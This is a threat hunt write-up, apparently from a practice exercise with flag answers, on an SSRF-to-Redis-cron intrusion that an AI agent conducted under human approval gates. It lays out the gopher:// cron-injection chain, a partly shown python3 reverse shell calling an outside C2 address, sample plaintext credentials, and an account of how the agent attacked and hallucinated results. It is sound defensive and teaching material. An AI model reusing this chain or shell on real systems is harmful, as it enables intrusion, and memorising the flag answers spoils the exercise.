# Threat Hunt Report: Operation QUARTZFANG

**Analyst:** Jason Moore
**Workspace:** LAW-HuntPractice (Microsoft Sentinel / Log Analytics, KQL)
**Hunt window:** 20 September 2026, 06:30–08:30 UTC
**Scenario reference:** Anthropic threat intelligence, Campaign C0062 (November 2025): the first documented cyberattack executed largely by an AI agent, with a human operator at strategic decision points.

---

## 1. Executive Summary

SemiCrest Technologies, a semiconductor design company, was compromised through a **server-side request forgery (SSRF)** flaw in the design portal's document preview API (`/api/v1/preview`). The attacker got past a `file://` scheme filter by switching to `gopher://` 18 seconds after the first attempt was rejected. Through that scheme they wrote a malicious crontab via the local Redis instance, which gave them a **root reverse shell** on `sc-portal01`.

From the foothold, the attacker took two service credentials from `/etc/semicrest/portal.conf` and moved laterally to:

- the PostgreSQL database (`sc-db01`), dumping users, password hashes, customer PII and project metadata
- the Harbor container registry (`sc-registry01`), enumerating and inspecting image layers
- the internal admin API (`sc-admin01`), where they mapped services and topology but were **denied (403)** access to the secrets store

They then staged an encrypted archive, exfiltrated it over HTTPS to `198.51.100.210:443`, and created a local account (`svc_monitor`) for persistence.

A recovered **attacker AI-agent log** (`LLMAgentLogs_CL`) shows the operation was carried out by an AI agent working in machine-speed bursts, with a **human operator approving four phase transitions**. Cross-referencing the agent's narration against infrastructure telemetry shows **two hallucinated claims**: secrets "extracted" from `sc-admin01` and an admin database credential "found" in a registry image. This matches the C0062 finding that AI fabrication limits autonomy and forces human verification.

**Classification:** human-directed AI agent intrusion (ATT&CK **T1588.007**, Obtain Capabilities: Artificial Intelligence).

---

## 2. Case File

| Item | Detail |
|---|---|
| Trigger | Analytics rule on `sc-portal01` at 06:52 UTC: one rejected and one accepted request to the document preview API |
| Known at handoff | Unusual preview API requests, an unexpected process under the web app, a DB spike on `sc-db01`, an outbound HTTPS transfer, and a new unexplained account |
| Tables | `DeviceProcessEvents_CL`, `DeviceNetworkEvents_CL`, `DeviceFileEvents_CL`, `DeviceEvents_CL`, `DeviceLogonEvents_CL`, `Syslog`, `PortalAccessLog_CL`, `ContainerRegistryLog_CL`, `LLMAgentLogs_CL` |

### Environment Topology

| Host | IP | Role |
|---|---|---|
| sc-portal01 | 10.5.0.10 | Design portal (Flask/Gunicorn behind nginx, local Redis) |
| sc-db01 | 10.5.0.20 | PostgreSQL database |
| sc-registry01 | 10.5.0.30 | Harbor container registry |
| sc-admin01 | 10.5.0.40 | Internal admin platform (API on 8443) |
| CI runner / admin workstations | 10.5.0.100, 10.5.0.101 | Legitimate baseline sources |

### Data Quirks Noted During the Hunt

- Many exports contained **duplicated rows at identical timestamps** (an ingestion artefact). Events were de-duplicated before analysis.
- `LLMAgentLogs_CL` is shared across several hunts. Scope it with `HuntName == "quartzfang"`. Real event time is in `OriginalTime`, not `TimeGenerated`, and `OriginalTime` was empty for the attacker rows.
- The data dictionary lists `tool_args`, but **the column doesn't exist**. Full file contents appeared in `model_response`, not `tool_result`.

---

## 3. Attack Timeline (UTC, 20 Sep 2026)

| Time | Host | Event | Source |
|---|---|---|---|
| 06:45–06:52 | sc-portal01 | Recon: external `192.0.2.10` browses `/api/v1/reviews`, `/api/v1/projects`; internal Nessus `10.5.0.250` scans | PortalAccessLog_CL |
| 06:52:30 | sc-portal01 | `POST /api/v1/preview?url=file:///etc/passwd` returns **400** | PortalAccessLog_CL |
| 06:52:48 | sc-portal01 | `POST /api/v1/preview?url=gopher://127.0.0.1:6379/_...FLUSHALL...SET 1 "*/1 * * * * ..."` returns **200** | PortalAccessLog_CL |
| 06:52:52 | sc-portal01 | `cron` (4400) starts `python3 -c import socket,subprocess,os...` (4401) as **root** | DeviceProcessEvents_CL |
| 06:52:55 | sc-portal01 | PID 4401 connects to **203.0.113.87:443** (C2) | DeviceNetworkEvents_CL |
| *Gate 1* | | Operator: "Foothold confirmed. Proceed with credential harvesting and lateral movement." | LLMAgentLogs_CL |
| 07:05:15 | sc-portal01 | `cat /etc/semicrest/portal.conf` (PID 4410) | DeviceProcessEvents_CL |
| 07:05:21 | sc-portal01 | `env` (PID 4411). **Output not captured** | DeviceProcessEvents_CL |
| 07:05:27 | sc-portal01 | `find / -name "*.conf" -o -name "*.env" ...` (PID 4412) | DeviceProcessEvents_CL |
| 07:16:14–25 | sc-db01 | `portal_svc` session: `SELECT *` on users, projects, customers, information_schema, **pg_shadow** | Syslog |
| 07:29:57–~07:32 | sc-db01 | Connection-pool exhaustion (`too many clients`). **Noise, not attacker** | Syslog |
| 07:33:01–05 | sc-registry01 | `ci-builder` from 10.5.0.10: login, list_repository, pull_manifest, inspect_layer (`semicrest/portal-build`) | ContainerRegistryLog_CL |
| *Gate 2* | | Operator: "Authorise data collection ... and admin API enumeration on sc-admin01." | LLMAgentLogs_CL |
| 07:43:01 | sc-db01 | New `portal_svc` session (no `application_name`) | Syslog |
| 07:45:18–23 | sc-db01 | Targeted collection: projects (revision, team_lead), customers (email, phone, company), users (**password_hash**) | Syslog |
| 07:45:27 / :31 | sc-admin01 | `GET /api/v1/services`, `/topology` as `portal_svc` return **200** | Syslog (admin_api) |
| 07:45:32 | sc-admin01 | `GET /api/v1/secrets` as `portal_svc` returns **403 Forbidden** | Syslog (admin_api) |
| *Gate 3* | | Operator: "Verify collected intelligence ... authorise documentation and staging." | LLMAgentLogs_CL |
| *Gate 4* | | Operator: "Review Phase 5 findings. Authorise documentation and exfiltration." | LLMAgentLogs_CL |
| ~08:15 | sc-portal01 | Staging with tar, gzip, openssl to `/tmp/.portal-cache/report.tar.gz.enc`; HTTPS exfil to **198.51.100.210:443** | DeviceFileEvents_CL / DeviceNetworkEvents_CL |
| post-exfil | sc-portal01 | Persistence: local account `svc_monitor` with sudo and an SSH key | DeviceEvents_CL / LLMAgentLogs_CL |

---

## 4. Flag Answers

### Section 1: Initial Access

| # | Question | Answer |
|---|---|---|
| 1 | Vulnerable endpoint | `/api/v1/preview` |
| 2 | The self-correct | `file://`, `gopher://`, 18 seconds |
| 3 | Exploit source | `203.0.113.87` (also the C2 callback IP) |
| 4 | Exploitation chain | SSRF via `gopher://` in `/api/v1/preview?url=` leads to Redis (127.0.0.1:6379) cron injection (FLUSHALL, SET cron payload, CONFIG SET dir/dbfilename, SAVE writes a root crontab), then `cron` spawns a `python3` reverse shell as root (cron PID 4400, python3 PID 4401, connects to 203.0.113.87:443) |

### Section 2: Credential Harvest

| # | Question | Answer |
|---|---|---|
| 5 | Configuration file and process tree | `/etc/semicrest/portal.conf` read by `cat` under `python3` under `cron` |
| 6 | Database credential | `portal_svc:Pr0jectAur0ra!` targeting `10.5.0.20` |
| 7 | Registry credential | `ci-builder:H4rb0rBu1ld!` targeting `10.5.0.30` |
| 8 | Visibility gap | Cannot be determined. `env` (PID 4411, 07:05:21, parent python3 4401) is recorded in DeviceProcessEvents_CL, but its output was never captured. Process telemetry logs command lines, not stdout, and LLMAgentLogs_CL has no tool_result for the env call. The portal.conf contents are visible only because the agent logged them in its `harvest_creds` output. |

**Recovered `portal.conf`** (from `LLMAgentLogs_CL.model_response`):

```
DATABASE_URL=postgresql://portal_svc:Pr0jectAur0ra!@10.5.0.20:5432/semicrest
REDIS_URL=redis://10.5.0.10:6379/0
REGISTRY_API=https://10.5.0.30/api/v2.0
REGISTRY_USER=ci-builder
REGISTRY_PASS=H4rb0rBu1ld!
ADMIN_API=https://10.5.0.40:8443/api/v1
```

### Section 3: Lateral Movement

| # | Question | Answer |
|---|---|---|
| 9 | Database query discrimination | **Statement structure:** unparameterized `SELECT *` and literal column lists vs the app's parameterized queries (`$1`). **Target selection:** pg_shadow, information_schema, full users/customers including password_hash vs narrow app reads. **Execution cadence:** bursts (5 queries in 11 s, 3 in 5 s) right after a new connection vs app queries spaced minutes apart. |
| 10 | Queried tables | `users, projects, customers, information_schema.tables, pg_catalog.pg_shadow` |
| 11 | Registry enumeration | `login, list_repository, pull_manifest, inspect_layer` |
| 12 | Admin API response | `403 Forbidden, access denied` |

### Section 4: AI Hallucination

| # | Question | Answer |
|---|---|---|
| 13 | Secrets store hallucination | Agent claims it extracted Kubernetes secrets (TLS certs, tokens, API keys) from sc-admin01. Telemetry shows `GET /api/v1/secrets` from 10.5.0.10 as portal_svc returned **403 Forbidden** at 07:45:32. Conclusion: the claim is hallucinated, so the agent's narration is unreliable and must be verified against host telemetry. |
| 14 | Registry credential hallucination | Agent claims `db_admin:Sup3rS3cure!` was found in the portal-build image layer, but the registry shows only metadata operations (login, list_repository, pull_manifest, inspect_layer) with no credentials, and `db_admin` never authenticated to sc-db01. |
| 15 | Hallucination as autonomy limitation | The AI fabricates successes and credentials it never obtained, so its self-reported findings can't be trusted. A human operator must verify results at each phase gate before authorising escalation, which prevents fully autonomous operation. |

### Section 5: Exfiltration and Persistence

| # | Question | Answer |
|---|---|---|
| 16 | Exfil destination and staging path | `198.51.100.210:443`, `/tmp/.portal-cache/report.tar.gz.enc` |
| 17 | Staging tools | `tar, gzip, openssl` |
| 18 | Persistence mechanism | `svc_monitor` with sudo privileges and an SSH key for passwordless re-entry |
| 19 | Exfil vs legitimate HTTPS | The initiating process (curl spawned from the attacker's root shell, not the gunicorn/python app) and a destination IP never seen in baseline traffic |

### Section 6: Reconnaissance and Timing

| # | Question | Answer |
|---|---|---|
| 20 | Scanner IPs | External `192.0.2.10` (plus other cluster members, not fully enumerated); internal `10.5.0.250` |
| 21 | Recon vs Nessus discrimination | Targeted API endpoints vs broad vuln checklist; mostly 200s vs many 404s; slow browser-like cadence vs high-volume burst with a Nessus user agent |
| 22 | Timing signature | A human shows steady, variable gaps between every command. This chain shows machine-speed bursts (seconds) separated by long pauses at operator approval gates, meaning an AI agent with a human approving each phase. |

### Section 7: Autonomy

| # | Question | Answer |
|---|---|---|
| 23 | Operator decision gates | 4 gates: exploitation→credential harvest/lateral movement, lateral movement→collection/admin enumeration, collection→documentation/staging, staging→exfiltration/persistence |
| 24 | Autonomy placement | Human-directed AI agent, shown by `LLMAgentLogs_CL.user_input` (operator approval gates) and `ContainerRegistryLog_CL.TimeGenerated` (4 registry operations in 3 seconds) |
| 25 | Novel ATT&CK technique | `T1588.007` Obtain Capabilities: Artificial Intelligence |

### Section 8: Real or Noise

| # | Question | Verdict | Answer |
|---|---|---|---|
| 26 | Credential reuse across services | **Real** | Process lineage: attacker sessions come from the python3 reverse-shell tree (cron→python3 PID 4401, as root), while legitimate use comes from gunicorn as www-data. On sc-db01, attacker connections also lack `application_name=portal_svc` and run unparameterized queries. |
| 27 | pg_dump disconfirmation | **Noise** | Normal scheduled activity: pg_dump runs as portal_svc at 03:00 every night in the 48-hour lead-in (before the 06:52 intrusion), with the same cron parent and schedule. |
| 28 | Connection spike dead end | **Noise** | The portal application exhausted PostgreSQL's connection pool (`max_connections` reached). Only `connection received` / `FATAL: too many clients` lines, with no authorized sessions or queries. |

---

## 5. Agent Claims vs Telemetry

The recovered agent log mixes accurate findings with fabrications. Every claim was checked against infrastructure telemetry.

| Agent tool / claim | Telemetry | Verdict |
|---|---|---|
| `fuzz_schemes`: http/https pass; file/ftp/dict blocked | Only one `file://` (400) and one `gopher://` (200) appear in the portal log | Partly supported |
| `adapt_payload`: "gopher payload targeting Redis SLAVEOF" | Decoded payload is `FLUSHALL` + `SET` cron entry (crontab write, not SLAVEOF) | **Inaccurate** |
| `rce_confirmed`: reverse shell on sc-portal01 | cron→python3 as root, callback to 203.0.113.87:443 | Accurate |
| `harvest_creds`: "three service credentials harvested" | portal.conf holds **two** credential pairs plus an admin API URL with no credential | **Overstated** |
| `query_database`: users, projects, customers, pg_catalog | Matches the sc-db01 Syslog statements | Accurate |
| `inspect_registry`: `db_admin:Sup3rS3cure!` in image layer | Registry shows metadata operations only; no `db_admin` auth on sc-db01 | **Hallucinated** |
| `extract_secrets`: Kubernetes secrets from sc-admin01 | `GET /api/v1/secrets` returned **403** | **Hallucinated** |
| `stage_archive` / `exfiltrate` / `persist` | Accepted as flag answers (Q16–18); see note in Section 9 | Accepted |

---

## 6. Indicators of Compromise

### Network

| Type | Indicator | Context |
|---|---|---|
| IPv4 | `203.0.113.87` | Exploit source and reverse-shell C2 (443/TCP) |
| IPv4:port | `198.51.100.210:443` | Exfiltration destination |
| IPv4 | `192.0.2.10` | External reconnaissance |
| IPv4 | `10.5.0.250` | Internal scanner (Nessus), baseline |

### Host / File

| Type | Indicator | Context |
|---|---|---|
| URL path | `/api/v1/preview?url=gopher://127.0.0.1:6379/...` | SSRF exploit request |
| URL path | `/api/v1/preview?url=file:///etc/passwd` | Rejected SSRF probe |
| Process | `cron` → `python3 -c import socket,subprocess,os;...` (root) | Reverse shell |
| File | `/etc/semicrest/portal.conf` | Credential source |
| File | `/tmp/.portal-cache/report.tar.gz.enc` | Staged, AES-256-CBC encrypted archive |
| Tools | `tar`, `gzip`, `openssl` | Archive and encrypt |
| Account | `svc_monitor` | Persistence (sudo + SSH key) |

### Credentials (rotate)

| Account | Service | Status |
|---|---|---|
| `portal_svc` / `Pr0jectAur0ra!` | PostgreSQL sc-db01 (also accepted by admin API read endpoints) | Compromised, used |
| `ci-builder` / `H4rb0rBu1ld!` | Harbor sc-registry01 | Compromised, used |
| `db_admin` / `Sup3rS3cure!` | Claimed by agent only | Unverified (hallucinated) |

### Behavioural Pivots

- SSRF scheme switching (`file://` to `gopher://`) within seconds on the same endpoint
- Unparameterized `SELECT *` / `pg_shadow` / `information_schema` queries from `portal_svc`
- PostgreSQL `connection authorized` lines for `portal_svc` **without** `application_name`
- Registry `pull_manifest` / `inspect_layer` from a non-CI source (10.5.0.10)
- Admin API calls by a service account (`portal_svc`) instead of named admins from 10.5.0.100/.101

---

## 7. MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Resource Development | **T1588.007** Obtain Capabilities: Artificial Intelligence | AI agent (`quartzfang-agent`) running the tactical chain |
| Reconnaissance | T1595.001 Active Scanning: Scanning IP Blocks | External cluster probing the portal before the exploit |
| Initial Access | T1190 Exploit Public-Facing Application | SSRF in `/api/v1/preview` |
| Credential Access | T1552 Unsecured Credentials | Plaintext service credentials on host |
| Credential Access | T1552.001 Unsecured Credentials: Credentials in Files | `/etc/semicrest/portal.conf` |
| Discovery | T1082 System Information Discovery | `env`, `find` sweeps; admin API topology/services |
| Discovery | T1046 Network Service Discovery | Enumeration of internal services (DB, registry, admin API) |
| Collection | T1213.006 Data from Information Repositories: Databases | users, customers, projects, pg_shadow dumps |
| Collection | T1560.001 Archive Collected Data: Archive via Utility | tar, gzip, openssl |
| Exfiltration | T1567 Exfiltration Over Web Service | HTTPS POST to 198.51.100.210:443 |
| Persistence | T1136.001 Create Account: Local Account | `svc_monitor` |

**Also observed (not in the submitted set):** T1053.003 Scheduled Task/Job: Cron (Redis-written crontab), T1059.006 Command and Scripting Interpreter: Python (reverse shell), T1078 Valid Accounts (reuse of portal_svc / ci-builder), T1071.001 Application Layer Protocol (C2 on 443).

---

## 8. Analyst Assessment

**How the operation was run.** The evidence puts this between full human control and full autonomy: **a person set a machine going and approved it at each phase**. Machine-speed execution appears across several tables (registry enumeration in 3 s, five DB queries in 11 s, three admin API calls in 5 s, an 18-second exploit correction). These bursts are separated by long idle periods that line up with four operator directives in `LLMAgentLogs_CL.user_input`. A human espionage operator would show steadier, variable gaps across the whole chain.

**Why the human was needed.** The agent reported two successes that never happened (admin secrets and the `db_admin` credential) and overstated a third ("three credentials"). Any operator relying on the agent's narration would have overestimated their access. The human gates exist to verify results before escalation, which matches Anthropic's C0062 observation that hallucination was a key limit on fully autonomous AI attacks.

**What worked defensively.** Authorization on `/api/v1/secrets` held (403). The scheme filter caught `file://` but not `gopher://`. Telemetry was strong for process lineage, DB statements and registry operations, but weak on command **output** (the `env` gap).

---

## 9. Gaps and Caveats

- **`env` output (Q8):** cannot be recovered from any table. Whether environment variables held further secrets is unknown.
- **Q16–Q18** (staging path, tools, `svc_monitor`) match the agent's narration. A direct `DeviceEvents_CL` query for account creation returned no rows in the tested window. Confirm the persistence artefacts with broader `DeviceFileEvents_CL` / `DeviceProcessEvents_CL` / `search "svc_monitor"` queries before relying on them.
- **Q20:** the external scanner cluster wasn't fully enumerated, since the initial portal query started at 06:45. Re-run from 06:30 to list every member.
- `OriginalTime` was empty for the attacker's agent rows, so they were ordered by correlating with infrastructure telemetry.

---

## 10. Recommendations

**Containment**
1. Isolate `sc-portal01`. Kill the cron-launched python3 shell, remove the malicious crontab, and remove the `svc_monitor` account, its sudoers entry and `authorized_keys`.
2. Block `203.0.113.87` and `198.51.100.210` at the egress firewall.
3. Rotate `portal_svc` and `ci-builder`, coordinating with the app team (don't simply revoke, which would break the portal). Treat everything readable from `users.password_hash` and `pg_shadow` as exposed.

**Remediation**
4. Fix the preview SSRF with a **scheme allow-list** (`https` only), block requests to loopback and internal ranges, and resolve-then-validate destinations.
5. Bind Redis to a Unix socket or require auth (`requirepass`, `protected-mode yes`), run it as a non-root user, and rename or disable `CONFIG`.
6. Move secrets out of `portal.conf` into a secrets manager. Give the DB and registry service accounts least privilege (no `pg_shadow` access for `portal_svc`; separate read-only CI credentials).

**Detection (KQL ideas)**
7. `PortalAccessLog_CL`: `UrlOriginal` containing `gopher://`, `dict://`, `file://`, or `127.0.0.1` / `localhost` in a `url=` parameter.
8. `DeviceProcessEvents_CL`: `InitiatingProcessFileName == "cron"` and `FileName` in (`python3`, `bash`, `sh`) with `socket` in the command line.
9. `Syslog` (sc-db01): `portal_svc` `connection authorized` without `application_name`, or any statement against `pg_shadow` / `information_schema`.
10. `ContainerRegistryLog_CL`: `inspect_layer` / `pull_manifest` from any source other than 10.5.0.100.
11. `Syslog` (sc-admin01): admin API requests by service accounts, or any 403 on `/api/v1/secrets`.

**Telemetry**
12. Capture command output or shell session logs (auditd/execve plus TTY logging) on internet-facing hosts to close the `env`-style visibility gap.

---

## 11. Lessons Learned

- **Don't trust the attacker's own log.** The AI agent's narration was both a key source (the only record of the portal.conf contents) and an unreliable witness (two hallucinations). Cross-reference every claim against host telemetry.
- **Same account, different behaviour.** Usernames didn't separate attacker from app. Process lineage, query structure, `application_name` and cadence did.
- **Disprove before escalating.** The pg_dump job and the 07:30 connection spike both looked suspicious, and both were baseline activity or noise.
- **Timing is a fingerprint.** Bursts of seconds separated by pauses of tens of minutes are the signature of an AI agent working under human approval gates.

